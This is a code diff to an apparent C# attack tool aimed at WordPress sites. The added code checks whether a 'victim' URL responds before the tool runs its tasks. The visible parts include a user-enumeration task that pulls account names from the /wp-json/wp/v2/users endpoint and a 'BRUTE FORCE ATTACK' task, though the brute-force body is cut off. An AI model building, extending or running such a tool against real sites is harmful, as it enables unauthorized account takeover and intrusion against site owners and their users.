@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
@@ -23,18 +24,19 @@ namespace react_background_service
         {
             SendStatus();
         }
-        
+
         static System.Threading.Tasks.Task Main()
         {
             var reportTimer = new System.Timers.Timer {Interval = 2000};
             reportTimer.Elapsed += ReportTimerElapsed;
             reportTimer.Start();
             
-            while (true)
+            while (true) // main loop
             {
+                // get new commands from front end
                 var command = Console.ReadLine();
 
-                if (command != null)
+                if (command != null) // we have a new command
                 {
                     var action = JsonConvert.DeserializeObject<Task>(command);
 
@@ -81,10 +83,32 @@ namespace react_background_service
                             
                         });
 
+                        // check the victim is alive
+                        var isAlive = false;
+                        try
+                        {
+                            HttpWebRequest checkEeq = (HttpWebRequest)WebRequest.Create(action.Url);
+                            var checkResponse = (HttpWebResponse)checkEeq.GetResponse();
+                            isAlive = checkResponse.StatusCode != (HttpStatusCode.BadRequest | HttpStatusCode.NotFound | HttpStatusCode.InternalServerError);
+                            checkResponse.Close();
+                        } catch
+                        {
+                            isAlive = false;
+                        }
+
+
+                        if (!isAlive)
+                        {
+                            var index = ProcessList.FindIndex(x => x.Id == id);
+                            var proc = ProcessList[index];
+                            proc.TaskStatus = Status.Stopped;
+                            proc.Exception = "INVALID_URL_EXCEPTION";
+                        }
+
                         SendStatus();
 
                         // USER ENUMERATION
-                        if (action.TaskType == Type.Enumeration)
+                        if (action.TaskType == Type.Enumeration && isAlive)
                         {
                             var enumTask = new System.Threading.Tasks.Task(async () =>
                             {
@@ -96,7 +120,7 @@ namespace react_background_service
 
                                 var client = new HttpClient();
                                 var response = await client.GetAsync(process.Url + "/wp-json/wp/v2/users");
-                                response.EnsureSuccessStatusCode(); // ToDo: Handle 404
+                                response.EnsureSuccessStatusCode();
                                 var responseBody = await response.Content.ReadAsStringAsync();
                                 var list = JsonConvert.DeserializeObject<List<UserObj>>(responseBody);
 
@@ -113,7 +137,7 @@ namespace react_background_service
                         }
 
                         // BRUTE FORCE ATTACK
-                        if (action.TaskType == Type.BruteForce)
+                        if (action.TaskType == Type.BruteForce && isAlive)
                         {
                             var bruteTask = new System.Threading.Tasks.Task(() =>
                             {
